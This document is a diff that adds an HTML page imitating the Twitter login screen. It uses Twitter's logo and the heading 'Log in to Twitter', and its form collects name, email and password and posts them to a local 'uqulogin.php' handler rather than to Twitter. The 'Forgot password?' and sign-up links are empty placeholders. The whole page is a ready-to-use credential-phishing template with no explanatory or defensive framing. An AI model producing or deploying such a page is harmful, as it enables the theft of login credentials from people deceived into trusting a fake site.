@@ -1,0 +1,66 @@
+
+<!DOCTYPE html>
+<html dir="ltr" lang="en">
+<head>
+<meta charset="utf-8">
+<title></title>
+<style>
+img {
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+}
+.button {
+  display: inline-block;
+  padding: 10px 80px;
+  font-size: 24px;
+  cursor: pointer;
+  text-align: center;
+  text-decoration: none;
+  outline: none;
+  color: #fff;
+  background-color: #b3e6ff;
+  border: none;
+  border-radius: 30px;
+
+}
+
+.button:hover {background-color: #b3e6ff}
+
+.button:active {
+  background-color: #b3e6ff;
+  box-shadow: 0 5px #666;
+  transform: translateY(4px);
+}
+
+</style>
+</head>
+<body >
+
+
+   <img  width="46" height="38" srcset="https://abs.twimg.com/errors/logo46x38.png 1x, https://abs.twimg.com/errors/logo46x38@2x.png 2x" src="https://abs.twimg.com/errors/logo46x38.png" alt="Twitter" />
+      <h1 style="text-align:center;">Log in to Twitter</h1>
+<center style="margin-top:20%"
+
+
+
+
+<form action="uqulogin.php" method="post">
+
+<label>Name</label><br>
+<input type="text" name="name"><br>
+
+<label>Email</label><br>
+<input type="Email" name="Email"><br>
+
+<label>password</label><br>
+<input type="password" name="password"><br><br>
+
+<button class="button">Log in</button><br><br>
+
+
+</form>
+<a href="">Forgot password?</a><a href="">Sign up for Twitter</a>
+</center>
+</body>
+</html>
